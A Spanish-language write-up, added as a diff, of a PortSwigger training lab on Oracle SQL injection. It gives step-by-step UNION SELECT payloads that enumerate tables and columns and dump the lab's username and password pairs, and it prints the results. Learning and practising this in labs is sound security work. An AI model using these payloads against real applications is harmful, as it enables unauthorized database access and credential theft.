@@ -1,0 +1,107 @@
+>>>>>>>Portswigger
+>>>>>SQLI union select attack
+>>>Lab10
+
+En este lab tenemos que ingresar con el usuario administrador mediante union select attack en servidor oracle
+
+Comenzamos con lo basico
+
+> 'union select null, null from dual-- -
+
+Utilizamos "dual" porque es una tabla que es muy probable que se encuentre en servidores oracle. La pagina no presenta error.
+
+Ahora intentaremos ver la infromacion alojada
+
+> 'union select null, table_name from all_tables-- -
+
+El anterior comando dio los siguientes resultados:
+
+APP_ROLE_MEMBERSHIP
+APP_USERS_AND_ROLES
+AUDIT_ACTIONS
+DR$NUMBER_SEQUENCE
+DR$OBJECT_ATTRIBUTE
+DR$POLICY_TAB
+DR$THS
+DR$THS_PHRASE
+DUAL
+HELP
+HS$_PARALLEL_METADATA
+HS_BULKLOAD_VIEW_OBJ
+HS_PARTITION_COL_NAME
+HS_PARTITION_COL_TYPE
+IMPDP_STATS
+KU$NOEXP_TAB
+KU$_DATAPUMP_MASTER_10_1
+KU$_DATAPUMP_MASTER_11_1
+KU$_DATAPUMP_MASTER_11_1_0_7
+KU$_DATAPUMP_MASTER_11_2
+KU$_LIST_FILTER_TEMP
+KU$_LIST_FILTER_TEMP_2
+NTV2_XML_DATA
+ODCI_PMO_ROWIDS$
+ODCI_SECOBJ$
+ODCI_WARNINGS$
+OGIS_GEOMETRY_COLUMNS
+OGIS_SPATIAL_REFERENCE_SYSTEMS
+OL$
+OL$HINTS
+OL$NODES
+PLAN_TABLE$
+PRODUCTS
+PSTUBTBL
+SDO_COORD_AXES
+SDO_COORD_AXIS_NAMES
+SDO_COORD_OPS
+SDO_COORD_OP_METHODS
+SDO_COORD_OP_PARAMS
+SDO_COORD_OP_PARAM_USE
+SDO_COORD_OP_PARAM_VALS
+SDO_COORD_OP_PATHS
+SDO_COORD_REF_SYS
+SDO_COORD_SYS
+SDO_CRS_GEOGRAPHIC_PLUS_HEIGHT
+SDO_CS_CONTEXT_INFORMATION
+SDO_CS_SRS
+SDO_DATUMS
+SDO_DATUMS_OLD_SNAPSHOT
+SDO_ELLIPSOIDS
+SDO_ELLIPSOIDS_OLD_SNAPSHOT
+SDO_PREFERRED_OPS_SYSTEM
+SDO_PREFERRED_OPS_USER
+SDO_PRIME_MERIDIANS
+SDO_PROJECTIONS_OLD_SNAPSHOT
+SDO_ST_TOLERANCE
+SDO_TOPO_DATA$
+SDO_TOPO_RELATION_DATA
+SDO_TOPO_TRANSACT_DATA
+SDO_TXN_IDX_DELETES
+SDO_TXN_IDX_EXP_UPD_RGN
+SDO_TXN_IDX_INSERTS
+SDO_UNITS_OF_MEASURE
+SDO_XML_SCHEMAS
+SRSNAMESPACE_TABLE
+STMT_AUDIT_OPTION_MAP
+SYSTEM_PRIVILEGE_MAP
+TABLE_PRIVILEGE_MAP
+USERS_POYEJA
+WRI$_ADV_ASA_RECO_DATA
+WRR$_REPLAY_CALL_FILTER
+WWV_FLOW_DUAL100
+
+Investigaremos la table "USERS_POYEJA"
+
+> 'union select null, column_name from all_tab_columns where table_name='USERS_POYEJA'-- -
+
+De resultado dio 2 columnas:
+
+PASSWORD_OHYPBH
+USERNAME_QHMRYA
+
+> 'union select null, USERNAME_QHMRYA||':'||PASSWORD_OHYPBH from USERS_POYEJA-- -
+
+En oracle presenta problemas >concat(users, ':', pass)< asi que se utilizo >||':'||< y no realizo problema. El resultado fue el siguiente
+
+administrator:r9zfe04dkd3av14wlmk2
+carlos:fg9dnmglqql88wjl9qgc
+wiener:qsqcoksemzs1ni5y1hav
